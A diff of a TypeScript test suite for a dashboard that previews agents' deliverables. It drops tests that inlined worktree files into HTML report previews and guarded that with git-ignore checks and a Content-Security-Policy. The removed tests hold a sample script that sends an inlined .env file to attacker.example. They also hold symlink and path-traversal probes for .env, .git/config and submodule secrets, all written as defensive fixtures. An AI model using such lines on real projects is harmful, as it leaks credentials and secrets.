@@ -2,7 +2,6 @@
 // dashboard the panel would get.
 import assert from "node:assert/strict";
 import { execFile } from "node:child_process";
-import { createHash } from "node:crypto";
 import { appendFile, mkdir, mkdtemp, readdir, readFile, readlink, realpath, rm, symlink, truncate, utimes, writeFile } from "node:fs/promises";
 import { hostname, tmpdir } from "node:os";
 import { basename, delimiter, dirname, join } from "node:path";
@@ -34,7 +33,7 @@ import {
   attachmentIcon,
   canPreview,
   deliverableAttachment,
-  opensAsPage,
+  isPage,
   opensInTab,
   findAttachment,
   folderAttachments,
@@ -47,7 +46,6 @@ import { mirrorQuestionMode, questionModePath, readQuestionMode, writeQuestionMo
 import type { QuestionMode } from "../shared/question-modes.ts";
 import { ticketStory } from "../shared/ticket-story.ts";
 import { parseBlocks } from "../shared/blocks.ts";
-import { PAGE_ESCAPE_SCRIPT } from "../shared/page.ts";
 
 // Real repos in these tests; the user's own git config stays out of them.
 process.env.GIT_CONFIG_GLOBAL = "/dev/null";
@@ -1788,7 +1786,7 @@ test("image and text deliverables preview, only inside the worktree", async (t) 
   assert.deepEqual(await previewDeliverable(w.directory, "D2"), { kind: "markdown", markdown: "# Notes", bytes: 7, truncated: false });
   await writeFile(join(w.directory, "shots", "data.bin"), "x");
   await w.run("deliverable", "add", "Data", "shots/data.bin");
-  await assert.rejects(previewDeliverable(w.directory, "D5"), /isn't an image, video, PDF, text or HTML file/);
+  await assert.rejects(previewDeliverable(w.directory, "D5"), /isn't an image, video, PDF or text file/);
   await assert.rejects(previewDeliverable(w.directory, "D3"), /too large to preview/);
   await assert.rejects(previewDeliverable(w.directory, "D4"), /no longer exists|outside this worktree/);
   const longLog = "x".repeat(MAX_PREVIEW_TEXT_BYTES + 10);
@@ -1821,179 +1819,18 @@ test("image and text deliverables preview, only inside the worktree", async (t) 
   assert.equal(imageMimeType("report.html"), null);
 });
 
-test("an HTML report previews with the files beside it written in, only from inside the worktree", async (t) => {
+test("an HTML report opens in Paseo's own preview, so Progress neither previews it nor hands it to the host", async (t) => {
   const w = await screenshotRun(t);
-  await mkdir(join(w.directory, "report", "shots"), { recursive: true });
-  const png = Buffer.from("89504e470d0a1a0a", "hex");
-  await writeFile(join(w.directory, "report", "shots", "home.png"), png);
-  await writeFile(join(w.directory, "report", "views.js"), "document.body.append('</script>');");
-  await writeFile(join(w.directory, "report", "style.css"), "h1 { color: red }");
-  await writeFile(join(w.directory, "secret.png"), png);
-  const outsideDir = await mkdtemp(join(tmpdir(), "progress-outside-"));
-  t.after(() => rm(outsideDir, { recursive: true, force: true }));
-  await writeFile(join(outsideDir, "leak.js"), "steal()");
-  await writeFile(join(outsideDir, "leak.png"), png);
-  const escape = `../../${basename(outsideDir)}/leak.png`;
-  await symlink(join(outsideDir, "leak.js"), join(w.directory, "report", "leak.js"));
-  const page = [
-    `<script src="https://cdn.tailwindcss.com"></script>`,
-    `<link rel="stylesheet" href="style.css">`,
-    `<img alt="Home" src="shots/home.png">`,
-    `<img src="../secret.png">`,
-    `<img src="${escape}">`,
-    `<img src="https://example.com/a.png">`,
-    `<img src="missing.png">`,
-    `<script defer src="views.js"></script>`,
-    `<script src="leak.js"></script>`,
-  ].join("\n");
-  await writeFile(join(w.directory, "report", "index.html"), page);
+  await mkdir(join(w.directory, "report"), { recursive: true });
+  await writeFile(join(w.directory, "report", "index.html"), "<h1>Report</h1>");
   await w.run("deliverable", "add", "Report", "report/index.html");
-  const preview = await previewDeliverable(w.directory, "D1");
-  assert.deepEqual(
-    preview,
-    {
-      kind: "html",
-      bytes: Buffer.byteLength(page),
-      html: [
-        `<script src="https://cdn.tailwindcss.com"></script>`,
-        `<style>h1 { color: red }</style>`,
-        `<img alt="Home" src="data:image/png;base64,${png.toString("base64")}">`,
-        `<img src="data:image/png;base64,${png.toString("base64")}">`,
-        `<img src="${escape}">`,
-        `<img src="https://example.com/a.png">`,
-        `<img src="missing.png">`,
-        `<script defer>document.body.append('<\\/script>');</script>`,
-        `<script src="leak.js"></script>`,
-      ].join("\n"),
-    },
-    "files in the worktree are written in; web addresses, missing files and anything outside the worktree stay as written",
-  );
+  await assert.rejects(previewDeliverable(w.directory, "D1"), /report\/index\.html isn't an image, video, PDF or text file/);
   const report = findAttachment((await readProgress(w.store)).dashboard, "D1")!;
   assert.equal(attachmentIcon(report), "FileCode");
-  assert.equal(canPreview(report, { browser: true }), false, "a page is too wide for the preview dialog");
-  assert.equal(opensAsPage(report, { browser: true }), true, "the desktop app gives the page a screen of its own");
-  assert.equal(opensAsPage(report, { browser: false }), false, "the phone apps can't draw a page");
+  assert.equal(isPage(report), true, "its row links to the file, which Paseo opens in a tab");
+  assert.equal(canPreview(report, { browser: true }), false);
   assert.equal(opensOnHost(report.path!), false, "a page never opens in the host's browser, where its scripts could read the user's files");
-});
-
-test("a page git tracks can't write in files git ignores; a page in an ignored folder gets only its own folder's", async (t) => {
-  const repo = await newRepo(t);
-  await writeFile(join(repo.directory, ".gitignore"), ".env\n.scratch/\n");
-  await writeFile(join(repo.directory, ".env"), "SECRET=1");
-  await mkdir(join(repo.directory, "report"));
-  await writeFile(join(repo.directory, "report", "app.js"), "run()");
-  const tracked = [`<script src="app.js"></script>`, `<script src="../.env"></script>`, `<script src="../.git/config"></script>`].join("\n");
-  await writeFile(join(repo.directory, "report", "index.html"), tracked);
-  await git(repo.directory, "add", "-A");
-  await git(repo.directory, "commit", "-qm", "a cloned repo with a page");
-  await mkdir(join(repo.directory, ".scratch"));
-  await writeFile(join(repo.directory, ".scratch", "notes.js"), "notes()");
-  await writeFile(join(repo.directory, ".scratch", "page.html"), [`<script src="notes.js"></script>`, `<script src="../.env"></script>`].join("\n"));
-  await repo.run(repo.directory, "start", "Run");
-  await repo.run(repo.directory, "deliverable", "add", "Tracked", "report/index.html");
-  await repo.run(repo.directory, "deliverable", "add", "Agent's", ".scratch/page.html");
-
-  const html = async (id: string) => {
-    const preview = await previewDeliverable(repo.directory, id);
-    assert.ok(preview.kind === "html");
-    return preview.html;
-  };
-  assert.equal(
-    await html("D1"),
-    [`<script>run()</script>`, `<script src="../.env"></script>`, `<script src="../.git/config"></script>`].join("\n"),
-    "tracked files go in; ignored ones and .git stay out",
-  );
-  assert.equal(
-    await html("D2"),
-    [`${PRIVATE_PAGE_META}<script>notes()</script>`, `<script src="../.env"></script>`].join("\n"),
-    "an ignored page gets ignored files beside it, not the repo's .env, and then runs none of its own scripts",
-  );
-});
-
-// Progress's own Escape script is the only one a page with ignored files runs.
-const PRIVATE_PAGE_POLICY = [
-  "default-src 'none'",
-  "img-src data:",
-  "media-src data:",
-  "font-src data:",
-  "style-src 'unsafe-inline'",
-  `script-src 'sha256-${createHash("sha256").update(PAGE_ESCAPE_SCRIPT).digest("base64")}'`,
-  "form-action 'none'",
-].join("; ");
-const PRIVATE_PAGE_META = `<meta http-equiv="Content-Security-Policy" content="${PRIVATE_PAGE_POLICY}">`;
-
-test("a page handed a file git ignores runs none of its own scripts and loads nothing, so it can't send the file anywhere", async (t) => {
-  const repo = await newRepo(t);
-  await writeFile(join(repo.directory, ".gitignore"), "/report.html\n/bare.html\n/plain.html\n.env\n");
-  await writeFile(join(repo.directory, ".env"), "SECRET=1");
-  const png = Buffer.from("89504e470d0a1a0a", "hex");
-  await writeFile(join(repo.directory, "logo.png"), png);
-  await git(repo.directory, "add", "-A");
-  await git(repo.directory, "commit", "-qm", "a cloned repo");
-  const leak = `<img id="x" src=".env"><script>new Image().src = "https://attacker.example/?d=" + document.getElementById("x").src</script>`;
-  await writeFile(join(repo.directory, "report.html"), `<!DOCTYPE html>\n${leak}`);
-  await writeFile(join(repo.directory, "bare.html"), leak);
-  await writeFile(join(repo.directory, "plain.html"), `<!doctype html><img src="logo.png"><script src="https://cdn.example/chart.js"></script>`);
-  await writeFile(join(repo.directory, "kept.html"), `<img src="logo.png"><script src="https://cdn.example/chart.js"></script>`);
-  await repo.run(repo.directory, "start", "Run");
-  for (const page of ["report.html", "bare.html", "plain.html", "kept.html"]) await repo.run(repo.directory, "deliverable", "add", page, page);
-  const html = async (id: string) => {
-    const preview = await previewDeliverable(repo.directory, id);
-    assert.ok(preview.kind === "html");
-    return preview.html;
-  };
-  const env = `data:application/octet-stream;base64,${Buffer.from("SECRET=1").toString("base64")}`;
-  assert.equal(await html("D1"), `<!DOCTYPE html>${PRIVATE_PAGE_META}\n${leak.replace(".env", env)}`, "the policy comes first after the doctype");
-  assert.equal(await html("D2"), `${PRIVATE_PAGE_META}${leak.replace(".env", env)}`, "and first of all with no doctype");
-  const logo = `data:image/png;base64,${png.toString("base64")}`;
-  assert.equal(
-    await html("D3"),
-    `<!doctype html><img src="${logo}"><script src="https://cdn.example/chart.js"></script>`,
-    "an ignored page given only files git keeps runs as written",
-  );
-  assert.equal(await html("D4"), `<img src="${logo}"><script src="https://cdn.example/chart.js"></script>`, "so does a page git keeps");
-});
-
-test("a page gets a file only when git says it keeps it: not one in a nested .git, a submodule, or named like a git pattern", async (t) => {
-  const repo = await newRepo(t);
-  await writeFile(join(repo.directory, ".gitignore"), ".env\n");
-  await mkdir(join(repo.directory, "report"));
-  await writeFile(join(repo.directory, "report", "app.js"), "run()");
-  // Git reads a path starting ":(glob)" as a pattern, unless told otherwise.
-  await mkdir(join(repo.directory, ":(glob)secrets"));
-  await writeFile(join(repo.directory, ":(glob)secrets", ".env"), "PATTERN=1");
-  // A nested checkout's own credentials.
-  await mkdir(join(repo.directory, "nested", ".git"), { recursive: true });
-  await writeFile(join(repo.directory, "nested", ".git", "config"), "token=1");
-  // A submodule's ignored file, which the outer repo can't see into.
-  const sub = join(repo.directory, "sub");
-  await mkdir(sub);
-  await git(sub, "init", "-q");
-  await writeFile(join(sub, ".gitignore"), ".env\n");
-  await writeFile(join(sub, "page.html"), `<script src=".env"></script>`);
-  await git(sub, "add", "-A");
-  await git(sub, "commit", "-qm", "sub");
-  await writeFile(join(sub, ".env"), "SUB=1");
-  const refs = [
-    `<script src="app.js"></script>`,
-    `<script src="../:(glob)secrets/.env"></script>`,
-    `<script src="../nested/.git/config"></script>`,
-    `<script src="../sub/.env"></script>`,
-  ];
-  await writeFile(join(repo.directory, "report", "index.html"), refs.join("\n"));
-  await git(repo.directory, "add", "-A");
-  await git(repo.directory, "commit", "-qm", "a cloned repo with a submodule");
-  await repo.run(repo.directory, "start", "Run");
-  await repo.run(repo.directory, "deliverable", "add", "Tracked", "report/index.html");
-  await repo.run(repo.directory, "deliverable", "add", "In the submodule", "sub/page.html");
-
-  const html = async (id: string) => {
-    const preview = await previewDeliverable(repo.directory, id);
-    assert.ok(preview.kind === "html");
-    return preview.html;
-  };
-  assert.equal(await html("D1"), [`<script>run()</script>`, ...refs.slice(1)].join("\n"), "a tracked file goes in; the rest stay out");
-  assert.equal(await html("D2"), `<script src=".env"></script>`, "a page git can't answer for counts as tracked, and its files as kept out");
+  assert.equal(isPage({ ref: "D2", title: "Site", path: "site.html/", kind: "folder" }), false, "a folder named like a page lists its files");
 });
 
 test("a video previews as its type and size, then arrives in pieces", async (t) => {
@@ -2558,57 +2395,10 @@ test("git never runs from the repo, so a program the repo commits named git neve
   assert.equal(result.inRepo, true, "the real git answered for the repo");
 });
 
-test("a page git reports as ignored gets ignored files only from its own folder and below, never from .git", async (t) => {
-  const repo = await newRepo(t);
-  await writeFile(join(repo.directory, ".gitignore"), ".env\n.scratch/\n");
-  await writeFile(join(repo.directory, ".env"), "SECRET=1");
-  await writeFile(join(repo.directory, "app.js"), "run()");
-  await git(repo.directory, "add", "-A");
-  await git(repo.directory, "commit", "-qm", "a repo");
-  const report = join(repo.directory, ".scratch", "run");
-  await mkdir(join(report, "shots"), { recursive: true });
-  await writeFile(join(report, "style.css"), "h1 {}");
-  await writeFile(join(report, "shots", "home.js"), "home()");
-  await writeFile(join(repo.directory, ".scratch", "other.js"), "other()");
-  const refs = [
-    `<link rel="stylesheet" href="style.css">`,
-    `<script src="shots/home.js"></script>`,
-    `<script src="../../app.js"></script>`,
-    `<script src="../other.js"></script>`,
-    `<script src="../../.env"></script>`,
-    `<script src="../../.git/config"></script>`,
-    `<script src="../../.git/HEAD"></script>`,
-  ];
-  await writeFile(join(report, "report.html"), refs.join("\n"));
-  await repo.run(repo.directory, "start", "Run");
-  await repo.run(repo.directory, "deliverable", "add", "Report", ".scratch/run/report.html");
-  const preview = await previewDeliverable(repo.directory, "D1");
-  assert.ok(preview.kind === "html");
-  assert.equal(
-    preview.html,
-    [`${PRIVATE_PAGE_META}<style>h1 {}</style>`, `<script>home()</script>`, `<script>run()</script>`, ...refs.slice(3)].join("\n"),
-    "its folder's files and tracked files go in; ignored files elsewhere and .git stay out",
-  );
-});
-
-test("when git fails in a repo, a page gets no file git didn't vouch for, and git is asked again next time", async (t) => {
-  const repo = await newRepo(t);
-  await writeFile(join(repo.directory, ".gitignore"), ".env\n.scratch/\n");
-  await writeFile(join(repo.directory, ".env"), "SECRET=1");
-  await mkdir(join(repo.directory, ".scratch"));
-  await writeFile(join(repo.directory, ".scratch", "notes.js"), "notes()");
-  const refs = [`<script src="notes.js"></script>`, `<script src="../.env"></script>`, `<script src="../.git/config"></script>`];
-  await writeFile(join(repo.directory, ".scratch", "page.html"), refs.join("\n"));
-  await repo.run(repo.directory, "start", "Run");
-  await repo.run(repo.directory, "deliverable", "add", "Page", ".scratch/page.html");
-  // A git that fails without saying why, with the exit code that otherwise means "not ignored".
+test("when git fails in a repo, the panel doesn't offer saving, and git is asked again next time", async (t) => {
   const broken = await mkdtemp(join(tmpdir(), "progress-broken-git-"));
   t.after(() => rm(broken, { recursive: true, force: true }));
   await writeFile(join(broken, "git"), "#!/bin/sh\nexit 1\n", { mode: 0o755 });
-  const preview = await withPathFirst(broken, () => previewDeliverable(repo.directory, "D1"));
-  assert.ok(preview.kind === "html");
-  assert.equal(preview.html, refs.join("\n"), "nothing goes in");
-
   const fresh = await newRepo(t);
   const inRepo = async () => {
     const result = await handleGetDashboard({ workspaceId: "ws-1", workspaceDirectory: fresh.directory }, context);
